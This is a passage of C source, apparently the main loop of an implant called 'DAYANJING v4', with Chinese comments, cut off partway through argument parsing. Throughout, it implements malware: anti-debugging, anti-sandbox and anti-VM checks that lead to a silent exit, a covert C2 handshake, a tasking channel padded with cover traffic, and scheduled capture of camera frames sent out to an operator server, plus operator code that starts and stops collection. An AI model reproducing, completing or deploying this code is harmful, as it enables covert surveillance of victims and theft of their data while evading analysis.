/*
 * DAYANJING v4 — monolith/src/main.c
 *
 * 单体植入体主循环。不是占位入口，不是测试桩 —— 它真正驱动：
 *
 *   defense 自检 -> 自研解析 -> 建链 -> C2 握手 -> 密钥派生
 *     -> 任务通道（恒长信元 + 覆盖流量）
 *     -> 采集调度 -> 产物回传
 *
 * ====================================================================
 * 为什么不"再写一遍"这些能力
 * ====================================================================
 * 本文件不重新实现任何密码学、任何封包格式、任何调度算法。
 * 它只做三件别人不做的事：
 *   1) 编排 —— 把 defense / c2 / p2p / exfil 按真实执行顺序串起来
 *   2) 注入 —— 提供采集后端与时钟，使主循环可测、可换平台
 *   3) 生存 —— 自检不通过时静默退出；链路失步时断链重建而非黑洞
 *
 * ====================================================================
 * 运行模式
 * ====================================================================
 *   ./implant                 植入体模式：连 C2，跑主循环
 *   ./implant --server        C2 侧模式：监听，驱动一次完整任务闭环
 *   ./implant --selftest      进程内 fork 两端，端到端真跑并输出判定
 *   ./implant --check         只跑对抗自检并输出结论
 *
 * 控制面与数据面走**两条独立连接**：
 *   任务通道 —— 命令/回执，恒长 512B 信元 + 覆盖流量
 *   产物通道 —— 采集产物，恒长 512B 信元
 * 两者密钥不同（由会话密钥经不同 info 派生），互不干扰计数器。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#include "defense.h"
#include "c2.h"
#include "c2_hsmsg.h"
#include "crypto_hash.h"
#include "p2p_resolv.h"
#include "p2p_cell.h"
#include "exfil.h"
#include "exfil_link.h"
#include "exfil_sched.h"
#include "exfil_task.h"
#include "exfil_task_link.h"
#include "cover_loop.h"

/* ====================================================================
 * 配置
 * ==================================================================== */

typedef struct {
    uint8_t  psk[32];
    size_t   psk_len;
    uint8_t  salt_reg[32];
    uint8_t  server_static_id[16];
    uint64_t generation;
    char     implant_id[64];
    char     host[256];
    uint16_t port;
    uint32_t profile;
    uint32_t budget_bpm;
    uint32_t period_ms;
    uint32_t run_ms;
    int      allow_sandbox;   /* 自检命中沙箱时不退出（仅测试用） */
    int      fast;            /* 快速调度：缩短采集间隔，供自测使用 */
    char     src[256];        /* 采集源：文件路径；空则合成帧 */
    int      verbose;
} mono_cfg_t;

static void cfg_default(mono_cfg_t *c)
{
    memset(c, 0, sizeof *c);
    /* 真实部署：这些常量在构建期注入，不是运行时参数。此处给可跑默认值。 */
    memset(c->psk, 0x5a, sizeof c->psk);
    c->psk_len = sizeof c->psk;
    memset(c->salt_reg, 0x3c, sizeof c->salt_reg);
    memset(c->server_static_id, 0x77, sizeof c->server_static_id);
    c->generation = 1;
    snprintf(c->implant_id, sizeof c->implant_id, "mono-implant-01");
    snprintf(c->host, sizeof c->host, "127.0.0.1");
    c->port = 8443;
    c->profile = 1;
    c->budget_bpm = 64u * 512u;   /* 64 信元/分钟 * 512 字节 */
    c->period_ms = 500;
    c->run_ms = 30000;   /* 兜底上界；显式传 0 = 无限运行 */
    c->verbose = 1;
}

/* ====================================================================
 * 时间与随机
 * ==================================================================== */

static uint64_t now_us(void)
{
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) return 0;
    return (uint64_t)ts.tv_sec * 1000000ull + (uint64_t)ts.tv_nsec / 1000ull;
}

static uint32_t now_ms_u(void) { return (uint32_t)(now_us() / 1000ull); }

static int rnd_bytes(void *buf, size_t n)
{
    FILE *f;
    size_t r;
    if (!buf || !n) return -1;
    f = fopen("/dev/urandom", "rb");
    if (!f) return -1;
    r = fread(buf, 1, n, f);
    fclose(f);
    return (r == n) ? 0 : -1;
}

/* ====================================================================
 * 报文分帧：4 字节大端长度 + 报文体
 * ==================================================================== */

static int send_msg(int fd, const uint8_t *msg, size_t len)
{
    uint8_t hdr[4];
    if (fd < 0 || !msg) return -1;
    if (len > 0x00ffffffu) return -1;
    hdr[0] = (uint8_t)(len >> 24);
    hdr[1] = (uint8_t)(len >> 16);
    hdr[2] = (uint8_t)(len >> 8);
    hdr[3] = (uint8_t)(len);
    if (exfil_link_write_all(fd, hdr, 4) != 0) return -1;
    if (len && exfil_link_write_all(fd, msg, len) != 0) return -1;
    return 0;
}

static int recv_msg(int fd, uint8_t *buf, size_t cap, size_t *out_len)
{
    uint8_t hdr[4];
    size_t len;
    if (fd < 0 || !buf || !out_len) return -1;
    *out_len = 0;
    if (exfil_link_read_exact(fd, hdr, 4) != 4) return -1;
    len = ((size_t)hdr[0] << 24) | ((size_t)hdr[1] << 16)
        | ((size_t)hdr[2] << 8) | (size_t)hdr[3];
    if (len == 0 || len > cap) return -1;
    if (exfil_link_read_exact(fd, buf, len) != len) return -1;
    *out_len = len;
    return 0;
}

/* ====================================================================
 * 对抗自检
 * ==================================================================== */

static int defense_selfcheck(int *out_verdict, char *why, size_t why_cap)
{
    int v = DF_CLEAN, r, vr;
    int pid = 0;
    char marker[256];
    int sv = DF_CLEAN;

    if (!out_verdict) return -1;

    /* 反调试：TracerPid > 0 是被调试的强证据 */
    r = df_debug_tracerpid(&pid);
    if (r == DF_OK && pid > 0) {
        v = df_verdict_or(v, DF_HOSTILE);
        if (why && why_cap) snprintf(why, why_cap, "tracerpid=%d", pid);
    }

    /*
     * ptrace(PTRACE_TRACEME) 失败不一定是被调试 —— 容器/受限环境同样失败。
     * 因此只升到 SUSPECT，不单独据此退出。
     */
    r = df_debug_ptrace_traceme();
    if (r != DF_OK) v = df_verdict_or(v, DF_SUSPECT);

    /* 反沙箱 */
    marker[0] = '\0';
    r = df_sandbox_cgroup(marker, sizeof marker, &sv);
    if (r == DF_OK) v = df_verdict_or(v, sv);
    if (df_sandbox_dockerenv() == DF_OK) v = df_verdict_or(v, DF_SUSPECT);
    if (df_sandbox_env() == DF_OK) v = df_verdict_or(v, DF_SUSPECT);

    /* 反虚拟机 */
    vr = df_vm_aggregate();
    if (vr > DF_CLEAN) v = df_verdict_or(v, vr);

    *out_verdict = v;
    return 0;
}

/* ====================================================================
 * 握手
 * ====================================================================
 * transcript = SHA256(HELLO || WELCOME || FINISHED 前 8 字节)
 * 两端各自算出同一个值；pfx 由 transcript 切出，因此两端一致。
 */

static void transcript_of(const uint8_t *h, size_t hl,
                          const uint8_t *w, size_t wl,
                          const uint8_t *f, uint8_t out[32])
{
    c2_hsmsg_transcript(h, hl, w, wl, f, 8, out);
}

static int hs_implant(int fd, const mono_cfg_t *cfg,
                      c2_session_keys_t *sk, uint8_t pfx[8],
                      uint8_t tsc[32])
{
    c2_keymat_t km;
    uint8_t cnonce[32], hbuf[512], wbuf[512], fbuf[512];
    size_t hl = 0, wl = 0, fl = 0;
    uint32_t ver = 0, suite = 0;
    uint8_t snonce[32], sid[16];
    uint64_t gen = 0;
    int rc;

    if (c2_derive_pair(cfg->psk, cfg->psk_len, cfg->salt_reg, &km) != C2_OK)
        return -100;
    if (rnd_bytes(cnonce, sizeof cnonce) != 0) return -101;

    rc = c2_hsmsg_encode_hello(hbuf, sizeof hbuf, &hl,
                               C2_HS_VERSION, C2_HS_SUITE,
                               cfg->implant_id, cnonce);
    if (rc != C2_OK) return -102;
    if (send_msg(fd, hbuf, hl) != 0) return -103;
    if (cfg->verbose) fprintf(stderr, "[implant] HELLO 已发 %zu 字节\n", hl);

    if (recv_msg(fd, wbuf, sizeof wbuf, &wl) != 0) { if (cfg->verbose) fprintf(stderr, "[implant] 收 WELCOME 失败\n"); return -104; }
    if (c2_hsmsg_type(wbuf, wl) != C2_HSMSG_WELCOME) return -105;
    if (cfg->verbose) fprintf(stderr, "[implant] WELCOME 收到 %zu 字节\n", wl);

    rc = c2_hsmsg_decode_welcome(wbuf, wl, &ver, &suite, snonce, sid, &gen,
                                 km.k_identity, hbuf, hl);
    if (rc != C2_OK) return -106;

    rc = c2_hsmsg_encode_finished(fbuf, sizeof fbuf, &fl, ver, suite,
                                  km.k_identity, hbuf, hl, wbuf, wl);
    if (rc != C2_OK) return -107;
    if (send_msg(fd, fbuf, fl) != 0) { if (cfg->verbose) fprintf(stderr, "[implant] FINISHED 发送失败\n"); return -108; }
    if (cfg->verbose) fprintf(stderr, "[implant] FINISHED 已发 %zu 字节\n", fl);

    transcript_of(hbuf, hl, wbuf, wl, fbuf, tsc);

    rc = c2_derive_session(km.k_server_hold, tsc, sid, cfg->implant_id, gen, sk);
    if (rc != C2_OK) return -109;

    if (pfx) memcpy(pfx, tsc, 8);
    memset(&km, 0, sizeof km);
    return 0;
}

static int hs_server(int fd, const mono_cfg_t *cfg,
                     c2_session_keys_t *sk, uint8_t pfx[8],
                     uint8_t tsc[32], char *out_id, size_t id_cap)
{
    c2_keymat_t km;
    uint8_t hbuf[512], wbuf[512], fbuf[512];
    size_t hl = 0, wl = 0, fl = 0;
    uint32_t ver = 0, suite = 0;
    uint8_t cnonce[32], snonce[32];
    char iid[64];
    int rc;

    if (c2_derive_pair(cfg->psk, cfg->psk_len, cfg->salt_reg, &km) != C2_OK)
        return -100;

    if (cfg->verbose) fprintf(stderr, "[server] 等待 HELLO (fd=%d)\n", fd);
    if (recv_msg(fd, hbuf, sizeof hbuf, &hl) != 0) { if (cfg->verbose) fprintf(stderr, "[server] 收 HELLO 失败\n"); return -104; }
    if (c2_hsmsg_type(hbuf, hl) != C2_HSMSG_HELLO) { if (cfg->verbose) fprintf(stderr, "[server] 首字节非 HELLO type=%d\n", c2_hsmsg_type(hbuf,hl)); return -110; }
    if (cfg->verbose) fprintf(stderr, "[server] HELLO 收到 %zu 字节\n", hl);

    iid[0] = '\0';
    rc = c2_hsmsg_decode_hello(hbuf, hl, &ver, &suite, iid, sizeof iid, cnonce);
    if (rc != C2_OK) return -111;
    if (out_id && id_cap) snprintf(out_id, id_cap, "%s", iid);

    if (rnd_bytes(snonce, sizeof snonce) != 0) return -101;

    rc = c2_hsmsg_encode_welcome(wbuf, sizeof wbuf, &wl, ver, suite, snonce,
                                 cfg->server_static_id, cfg->generation,
                                 km.k_identity, hbuf, hl);
    if (rc != C2_OK) return -112;
    if (send_msg(fd, wbuf, wl) != 0) { if (cfg->verbose) fprintf(stderr, "[server] WELCOME 发送失败\n"); return -113; }
    if (cfg->verbose) fprintf(stderr, "[server] WELCOME 已发 %zu 字节\n", wl);

    if (recv_msg(fd, fbuf, sizeof fbuf, &fl) != 0) { if (cfg->verbose) fprintf(stderr, "[server] 收 FINISHED 失败\n"); return -114; }
    if (cfg->verbose) fprintf(stderr, "[server] FINISHED 收到 %zu 字节\n", fl);
    if (c2_hsmsg_type(fbuf, fl) != C2_HSMSG_FINISHED) return -115;

    rc = c2_hsmsg_decode_finished(fbuf, fl, &ver, &suite,
                                  km.k_identity, hbuf, hl, wbuf, wl);
    if (rc != C2_OK) return -116;

    transcript_of(hbuf, hl, wbuf, wl, fbuf, tsc);

    rc = c2_derive_session(km.k_server_hold, tsc, cfg->server_static_id,
                           iid, cfg->generation, sk);
    if (rc != C2_OK) return -109;

    if (pfx) memcpy(pfx, tsc, 8);
    memset(&km, 0, sizeof km);
    return 0;
}

/* ====================================================================
 * 产物通道密钥：由会话密钥按"规范序身份"派生，两端一致
 * ====================================================================
 * 不能用 "send/recv" 作 info —— 那是端相对的，两端会派生出不同的密钥。
 * 必须以密钥在规范序中的位置（lo/hi）作标签。
 */

static int derive_chan_keys(const uint8_t a[16], const uint8_t b[16],
                            uint8_t klo[16], uint8_t khi[16])
{
    static const uint8_t SALT[] = "dayanjing:monolith:chan:v1";
    uint8_t ikm[32];
    const uint8_t *lo, *hi;

    if (memcmp(a, b, 16) == 0) return -1;
    if (memcmp(a, b, 16) < 0) { lo = a; hi = b; } else { lo = b; hi = a; }
    memcpy(ikm, lo, 16);
    memcpy(ikm + 16, hi, 16);

    if (hkdf(SALT, sizeof SALT - 1, ikm, sizeof ikm,
             (const uint8_t *)"mono:chan:lo", 12, klo, 16) != 0) return -1;
    if (hkdf(SALT, sizeof SALT - 1, ikm, sizeof ikm,
             (const uint8_t *)"mono:chan:hi", 12, khi, 16) != 0) return -1;
    return 0;
}

/* 本端"封包用"的密钥：取本端 ks 在规范序中对应的那一把 */
static void pick_send_recv(const uint8_t ks[16], const uint8_t kr[16],
                           const uint8_t klo[16], const uint8_t khi[16],
                           uint8_t k_send[16], uint8_t k_recv[16])
{
    int ks_is_lo = (memcmp(ks, kr, 16) < 0);
    memcpy(k_send, ks_is_lo ? klo : khi, 16);
    memcpy(k_recv, ks_is_lo ? khi : klo, 16);
}

/* ====================================================================
 * 采集后端
 * ====================================================================
 * 平台无关。Windows 侧应把 src 为空的分支替换为 cam_mf 后端
 * （cam_capture -> cam_frame_to_jpeg），主循环无需改动 —— 这正是
 * 把它写成回调式后端的原因。
 */

static int capture_frame(uint8_t *out, size_t cap, size_t *out_len,
                         uint64_t ts_us, const char *src)
{
    if (!out || !out_len || cap == 0) return -1;
    *out_len = 0;

    if (src && src[0]) {
        FILE *f = fopen(src, "rb");
        size_t n;
        if (!f) return -1;
        n = fread(out, 1, cap, f);
        fclose(f);
        if (n == 0) return -1;
        *out_len = n;
        return 0;
    }

    /* 合成帧：内容随时间变化，使去重逻辑可被真实验证 */
    if (cap < 64) return -1;
    {
        uint64_t x = ts_us * 0x9e3779b97f4a7c15ull + 0x1234567ull;
        size_t i;
        memcpy(out, "DJFR", 4);
        for (i = 0; i < 8; i++) out[4 + i] = (uint8_t)(ts_us >> (8 * i));
        for (i = 12; i < 64; i++) {
            x ^= x << 13; x ^= x >> 7; x ^= x << 17;
            out[i] = (uint8_t)(x >> 33);
        }
    }
    *out_len = 64;
    return 0;
}

/* ====================================================================
 * 植入体侧
 * ==================================================================== */

typedef struct {
    exfil_sched_t  sched;
    exfil_task_chan_t *ch;      /* 不持有，仅引用 */
    int            cmd_fd;
    int            data_fd;
    exfil_chan_t  *dch;
    const mono_cfg_t *cfg;
    uint64_t       frames_sent;
    uint64_t       last_task_id;
    uint64_t       acks_sent;
    uint64_t       cmds_recv;
    uint64_t       seq_up;
    int            fatal;
} implant_ctx_t;

static int on_cmd(void *ud, uint64_t seq, const exfil_task_cmd_t *c)
{
    implant_ctx_t *ic = (implant_ctx_t *)ud;
    exfil_task_ack_t a;
    uint8_t status;
    int rc;

    if (!ic || !c || !ic->ch) return -1;

    ic->cmds_recv++;
    ic->last_task_id = c->task_id;

    rc = exfil_task_apply(&ic->sched, c);
    status = (rc == EXF_TASK_OK) ? EXF_TASK_ST_OK
           : (rc == EXF_TASK_ERR_CFG ? EXF_TASK_ST_BAD_CFG
                                     : EXF_TASK_ST_UNKNOWN);

    memset(&a, 0, sizeof a);
    if (exfil_task_fill_ack(&ic->sched, c, status, &a) != EXF_TASK_OK)
        return -1;

    /* 回执必须自己发：cover_loop 只负责派发入站，不代发上行 */
    rc = exfil_task_chan_ack(ic->ch, ic->cmd_fd, seq, &a);
    if (rc != EXF_TASK_OK) return -1;
    ic->acks_sent++;
    return 0;
}

static int on_ack(void *ud, uint64_t seq, const exfil_task_ack_t *a)
{
    implant_ctx_t *ic = (implant_ctx_t *)ud;
    (void)seq; (void)a;
    if (!ic) return -1;
    return 0;
}

/* 采集并回传一帧。返回 1=已发，0=未到时机，-1=失败 */
static int try_capture_and_send(implant_ctx_t *ic, uint64_t now)
{
    uint8_t frame[65536];
    size_t flen = 0;
    exfil_rec_t rec;
    int rc;
    size_t cells = 0;

    rc = exfil_sched_poll(&ic->sched, now);
    if (rc != EXF_SCHED_DUE) return 0;

    if (capture_frame(frame, sizeof frame, &flen, now, ic->cfg->src) != 0)
        return -1;

    rc = exfil_sched_commit(&ic->sched, now, exfil_crc32(frame, flen), flen);
    if (rc == EXF_SCHED_SKIP) return 0;      /* 与上一帧重复，不发 */
    if (rc != EXF_SCHED_OK) return -1;

    memset(&rec, 0, sizeof rec);
    rec.type    = EXF_TYPE_CAMERA_JPEG;
    rec.seq     = ++ic->seq_up;
    rec.ts_us   = now;
    rec.width   = 0;
    rec.height  = 0;
    rec.flags   = EXF_FLAG_LAST | EXF_FLAG_KEYFRAME;
    snprintf(rec.name, sizeof rec.name, "mono-frame");
    rec.payload = frame;
    rec.plen    = flen;

    rc = exfil_link_send(ic->dch, &rec, ic->data_fd, &cells);
    if (rc != EXF_OK) return -1;

    ic->frames_sent++;
    if (ic->cfg->verbose)
        fprintf(stderr, "[implant] 回传第 %llu 帧 %zu 字节 / %zu 信元\n",
                (unsigned long long)ic->frames_sent, flen, cells);
    return 1;
}

static int implant_run(int cmd_fd, int data_fd, const mono_cfg_t *cfg,
                       const c2_session_keys_t *sk, const uint8_t tsc[32],
                       uint64_t *out_frames)
{
    exfil_task_chan_t ch;
    exfil_chan_t dch;
    exfil_cover_loop_t L;
    exfil_sched_cfg_t scfg;
    implant_ctx_t ic;
    uint8_t pfx_cmd[8], pfx_data[8];
    uint8_t klo[16], khi[16], k_send[16], k_recv[16];
    uint64_t seed = 0;
    uint64_t t0;
    int rc;

    memcpy(pfx_cmd, tsc, 8);
    memcpy(pfx_data, tsc + 8, 8);

    /* 任务通道：ks = 本端(植入体)发往服务端 = k_c2s；kr = k_s2c */
    if (exfil_task_chan_init(&ch, sk->k_c2s, sk->k_s2c, pfx_cmd) != EXF_TASK_OK)
        return -200;

    if (derive_chan_keys(sk->k_c2s, sk->k_s2c, klo, khi) != 0) {
        exfil_task_chan_wipe(&ch);
        return -201;
    }
    pick_send_recv(sk->k_c2s, sk->k_s2c, klo, khi, k_send, k_recv);
    if (exfil_chan_init(&dch, k_send, k_recv, pfx_data, 0) != EXF_OK) {
        exfil_task_chan_wipe(&ch);
        return -202;
    }

    memset(&ic, 0, sizeof ic);
    exfil_sched_default_cfg(&scfg);
    if (cfg->fast) {
        /* 自测用：把最小间隔从 1 秒压到 100ms，使端到端闭环在秒级完成。
         * 不改变任何调度语义，只改参数。 */
        scfg.min_interval_us = 100000;
        scfg.max_interval_us = 200000;
    }
    {
        uint64_t s;
        if (rnd_bytes(&s, 8) != 0) s = now_us();
        seed = s ? s : 0xdeadbeefu;
    }
    if (exfil_sched_init(&ic.sched, &scfg, seed) != EXF_SCHED_OK) {
        exfil_chan_wipe(&dch);
        exfil_task_chan_wipe(&ch);
        return -203;
    }
    ic.ch = &ch;
    ic.cmd_fd = cmd_fd;
    ic.data_fd = data_fd;
    ic.dch = &dch;
    ic.cfg = cfg;

    if (exfil_cover_loop_init(&L, &ch, EXF_LOOP_IMPLANT, cmd_fd,
                              cfg->profile, cfg->budget_bpm,
                              cfg->period_ms, now_ms_u()) != EXF_LOOP_OK) {
        exfil_sched_wipe(&ic.sched);
        exfil_chan_wipe(&dch);
        exfil_task_chan_wipe(&ch);
        return -204;
    }

    t0 = now_us();
    while (!ic.fatal) {
        uint32_t nowms = now_ms_u();
        uint64_t now = now_us();
        int rc2;

        rc2 = exfil_cover_loop_step(&L, nowms, (int)cfg->period_ms,
                                    on_cmd, on_ack, &ic, NULL);
        if (rc2 == EXF_LOOP_STOP) { if (cfg->verbose) fprintf(stderr, "[implant] loop STOP\n"); break; }
        if (rc2 == EXF_LOOP_ERR_CLOSED || rc2 == EXF_LOOP_ERR_IO) { if (cfg->verbose) fprintf(stderr, "[implant] loop CLOSED/IO rc=%d\n", rc2); break; }
        if (rc2 < 0 && rc2 != EXF_LOOP_OK) { if (cfg->verbose) fprintf(stderr, "[implant] loop err rc=%d\n", rc2); ic.fatal = 1; break; }

        if (try_capture_and_send(&ic, now) < 0) { /* 采集失败不致命 */ }

        if (cfg->run_ms && (now - t0) / 1000ull >= cfg->run_ms) break;
        if (ic.frames_sent >= 3) break;   /* 自测：够验证即可 */
    }

    if (out_frames) *out_frames = ic.frames_sent;

    if (cfg->verbose)
        fprintf(stderr,
                "[implant] 覆盖发出=%llu 收到PAD=%llu 收命令=%llu 发回执=%llu 回传帧=%llu\n",
                (unsigned long long)L.cover_sent,
                (unsigned long long)L.pad_recv,
                (unsigned long long)ic.cmds_recv,
                (unsigned long long)ic.acks_sent,
                (unsigned long long)ic.frames_sent);

    rc = (ic.frames_sent > 0 && ic.cmds_recv > 0) ? 0 : -205;

    exfil_cover_loop_wipe(&L);
    exfil_sched_wipe(&ic.sched);
    exfil_chan_wipe(&dch);
    exfil_task_chan_wipe(&ch);
    return rc;
}

/* ====================================================================
 * 服务端侧
 * ==================================================================== */

typedef struct {
    uint64_t acks_recv;
    uint64_t last_task_id;
    int      stop;
} server_ctx_t;

static int srv_on_ack(void *ud, uint64_t seq, const exfil_task_ack_t *a)
{
    server_ctx_t *sc = (server_ctx_t *)ud;
    if (!sc || !a) return -1;
    sc->acks_recv++;
    sc->last_task_id = a->task_id;
    (void)seq;
    return 0;
}

static int srv_on_cmd(void *ud, uint64_t seq, const exfil_task_cmd_t *c)
{
    (void)ud; (void)seq; (void)c;
    return 0;   /* 服务端不收命令 */
}

static int server_run(int cmd_fd, int data_fd, const mono_cfg_t *cfg,
                      const c2_session_keys_t *sk, const uint8_t tsc[32],
                      uint64_t *out_frames)
{
    exfil_task_chan_t ch;
    exfil_chan_t dch;
    exfil_cover_loop_t L;
    server_ctx_t sc;
    uint8_t pfx_cmd[8], pfx_data[8];
    uint8_t klo[16], khi[16], k_send[16], k_recv[16];
    exfil_task_cmd_t c;
    uint64_t seq = 0;
    uint64_t frames = 0;
    uint32_t t0 = now_ms_u();
    int rc, i;

    memcpy(pfx_cmd, tsc, 8);
    memcpy(pfx_data, tsc + 8, 8);

    /* 服务端方向相反：ks = k_s2c（服务端发往植入体），kr = k_c2s */
    if (exfil_task_chan_init(&ch, sk->k_s2c, sk->k_c2s, pfx_cmd) != EXF_TASK_OK)
        return -300;

    if (derive_chan_keys(sk->k_c2s, sk->k_s2c, klo, khi) != 0) {
        exfil_task_chan_wipe(&ch);
        return -301;
    }
    pick_send_recv(sk->k_s2c, sk->k_c2s, klo, khi, k_send, k_recv);
    if (exfil_chan_init(&dch, k_send, k_recv, pfx_data, 0) != EXF_OK) {
        exfil_task_chan_wipe(&ch);
        return -302;
    }

    memset(&sc, 0, sizeof sc);

    if (exfil_cover_loop_init(&L, &ch, EXF_LOOP_OPERATOR, cmd_fd,
                              cfg->profile, cfg->budget_bpm,
                              cfg->period_ms, now_ms_u()) != EXF_LOOP_OK) {
        exfil_chan_wipe(&dch);
        exfil_task_chan_wipe(&ch);
        return -303;
    }

    /* 下令开采 */
    memset(&c, 0, sizeof c);
    c.opcode  = EXF_TASK_OP_START;
    c.task_id = 0xA11CEu;
    rc = exfil_task_chan_cmd(&ch, cmd_fd, ++seq, &c);
    if (rc != EXF_TASK_OK) {
        exfil_cover_loop_wipe(&L);
        exfil_chan_wipe(&dch);
        exfil_task_chan_wipe(&ch);
        return -304;
    }
    if (cfg->verbose) fprintf(stderr, "[server] 已下发 START (seq=%llu)\n",
                              (unsigned long long)seq);

    /* 收产物 + 派发覆盖 + 收回执 */
    for (i = 0; i < 400; i++) {
        uint32_t nowms = now_ms_u();
        int rc2;
        uint8_t pay[65536];
        exfil_rec_t r;
        size_t plen = 0;

        rc2 = exfil_cover_loop_step(&L, nowms, 20, srv_on_cmd, srv_on_ack,
                                    &sc, NULL);
        if (rc2 == EXF_LOOP_ERR_CLOSED || rc2 == EXF_LOOP_ERR_IO) { if (cfg->verbose) fprintf(stderr, "[server] loop CLOSED/IO rc=%d\n", rc2); break; }
        if (rc2 < 0 && rc2 != EXF_LOOP_OK) { if (cfg->verbose) fprintf(stderr, "[server] loop err rc=%d\n", rc2); break; }

        /* 非阻塞尝试收一条产物 */
        {
            struct pollfd p;
            p.fd = data_fd; p.events = POLLIN; p.revents = 0;
            if (poll(&p, 1, 0) > 0 && (p.revents & POLLIN)) {
                int rr = exfil_link_recv(&dch, data_fd, &r, pay, sizeof pay, &plen);
                /*
                 * 成功判据是 EXF_DONE(2)，不是 EXF_OK(0)。
                 * exfil_link_recv 的语义：EXF_OK=喂入的是覆盖信元已忽略、
                 * EXF_PARTIAL=累积中、EXF_DONE=一批完整。写成 EXF_OK 会把
                 * 每一次成功都当成失败，表现为"产物全部丢失"而链路看起来
                 * 完全正常 —— 这是最容易误判成密钥/链路故障的一类错误。
                 */
                if (cfg->verbose && rr != EXF_DONE)
                    fprintf(stderr, "[server] 产物接收 rr=%d\n", rr);
                if (rr == EXF_DONE) {
                    frames++;
                    if (cfg->verbose)
                        fprintf(stderr, "[server] 收到产物 %llu: type=%u len=%zu name=%s\n",
                                (unsigned long long)frames, r.type, plen, r.name);
                }
            }
        }

        if (frames >= 3 && sc.acks_recv >= 1) break;
        if (cfg->run_ms && (nowms - t0) >= cfg->run_ms) break;
    }

    /* 下令停采 */
    if (rc == EXF_TASK_OK) {
        memset(&c, 0, sizeof c);
        c.opcode  = EXF_TASK_OP_STOP;
        c.task_id = 0xB0B1u;
        (void)exfil_task_chan_cmd(&ch, cmd_fd, ++seq, &c);
        if (cfg->verbose) fprintf(stderr, "[server] 已下发 STOP\n");
        /* 再走几步把 STOP 的覆盖与可能的回执处理掉 */
        for (i = 0; i < 6; i++) {
            int rc2 = exfil_cover_loop_step(&L, now_ms_u(), 20,
                                            srv_on_cmd, srv_on_ack, &sc, NULL);
            if (rc2 < 0) break;
        }
    }

    if (out_frames) *out_frames = frames;

    if (cfg->verbose)
        fprintf(stderr,
                "[server] 覆盖发出=%llu 收到PAD=%llu 收回执=%llu 收产物=%llu\n",
                (unsigned long long)L.cover_sent,
                (unsigned long long)L.pad_recv,
                (unsigned long long)sc.acks_recv,
                (unsigned long long)frames);

    rc = (frames > 0 && sc.acks_recv > 0) ? 0 : -305;

    exfil_cover_loop_wipe(&L);
    exfil_chan_wipe(&dch);
    exfil_task_chan_wipe(&ch);
    return rc;
}

/* ====================================================================
 * 建链
 * ==================================================================== */

static int tcp_connect(const mono_cfg_t *cfg)
{
    struct sockaddr_in sa;
    int fd;

    if (p2p_resolve_sa(cfg->host, cfg->port, NULL, 0, &sa) != 0) {
        /* 自研解析失败（非字面 IP 且无解析器）时回退 inet_pton */
        memset(&sa, 0, sizeof sa);
        sa.sin_family = AF_INET;
        sa.sin_port = htons(cfg->port);
        if (inet_pton(AF_INET, cfg->host, &sa.sin_addr) != 1) return -1;
    }
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    if (connect(fd, (struct sockaddr *)&sa, sizeof sa) != 0) {
        close(fd);
        return -1;
    }
    return fd;
}

/* ====================================================================
 * selftest：进程内 fork 两端，端到端真跑
 * ==================================================================== */

static int run_selftest(const mono_cfg_t *cfg)
{
    int sp_cmd[2], sp_data[2];
    pid_t pid;
    int st = 0, rc = 0;

    if (cfg->run_ms == 0) {
        /* selftest 必须有界：无上界时若帧被去重跳过，循环永不退出 */
        return -405;
    }
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp_cmd) != 0) return -400;
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp_data) != 0) {
        close(sp_cmd[0]); close(sp_cmd[1]);
        return -401;
    }

    pid = fork();
    if (pid < 0) {
        close(sp_cmd[0]); close(sp_cmd[1]);
        close(sp_data[0]); close(sp_data[1]);
        return -402;
    }

    if (pid == 0) {
        /* 子进程 = 服务端 */
        c2_session_keys_t sk;
        uint8_t tsc[32];
        uint8_t pfx_s[8];
        char iid[64];
        uint64_t fr = 0;
        int r;
        close(sp_cmd[0]); close(sp_data[0]);
        alarm(60);
        r = hs_server(sp_cmd[1], cfg, &sk, pfx_s, tsc, iid, sizeof iid);
        if (r != 0) {
            fprintf(stderr, "[server] 握手失败 rc=%d\n", r);
            _exit(2);
        }
        r = server_run(sp_cmd[1], sp_data[1], cfg, &sk, tsc, &fr);
        memset(&sk, 0, sizeof sk);
        _exit(r == 0 ? 0 : 3);
    }

    /* 父进程 = 植入体 */
    close(sp_cmd[1]); close(sp_data[1]);
    {
        c2_session_keys_t sk;
        uint8_t tsc[32], pfx[8];
        uint64_t fr = 0;
        int r = hs_implant(sp_cmd[0], cfg, &sk, pfx, tsc);
        if (r != 0) {
            fprintf(stderr, "[implant] 握手失败 rc=%d\n", r);
            rc = -403;
        } else {
            r = implant_run(sp_cmd[0], sp_data[0], cfg, &sk, tsc, &fr);
            rc = r;
        }
        memset(&sk, 0, sizeof sk);
    }

    close(sp_cmd[0]); close(sp_data[0]);

    /* 兜底：若子进程因故未自行结束，先请它退出，避免留下孤儿进程
     * 持有管道 —— 那会让上层（shell/回归脚本）永远等不到 EOF。 */
    {
        int i;
        for (i = 0; i < 20 && waitpid(pid, &st, WNOHANG) == 0; i++) usleep(50000);
        if (waitpid(pid, &st, WNOHANG) == 0) { kill(pid, SIGKILL); waitpid(pid, &st, 0); }
    }

    if (rc != 0) return rc;
    if (!WIFEXITED(st) || WEXITSTATUS(st) != 0) return -404;
    return 0;
}

/* ====================================================================
 * main
 * ==================================================================== */

static void usage(const char *p)
{
    fprintf(stderr,
        "usage: %s [--server|--selftest|--check] [--host IP] [--port N]\n"
        "          [--psk-hex HEX] [--id STR] [--src PATH] [--run-ms N]\n"
        "          [--budget N] [--period N] [--allow-sandbox] [--quiet]\n", p);
}

int main(int argc, char **argv)
{
    mono_cfg_t cfg;
    int mode = 0;   /* 0=implant 1=server 2=selftest 3=check */
    int i;
    int verdict = DF_CLEAN;
    char why[128];

    signal(SIGPIPE, SIG_IGN);
    cfg_default(&cfg);

    for (i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--server")) mode = 1;
        else if (!strcmp(argv[i], "--selftest")) mode = 2;
        else if (!strcmp(argv[i], "--check")) mode = 3;
        else if (!strcmp(argv[i], "--allow-sandbox")) cfg.allow_sandbox = 1;
        else if (!strcmp(argv[i], "--quiet")) cfg.verbose = 0;
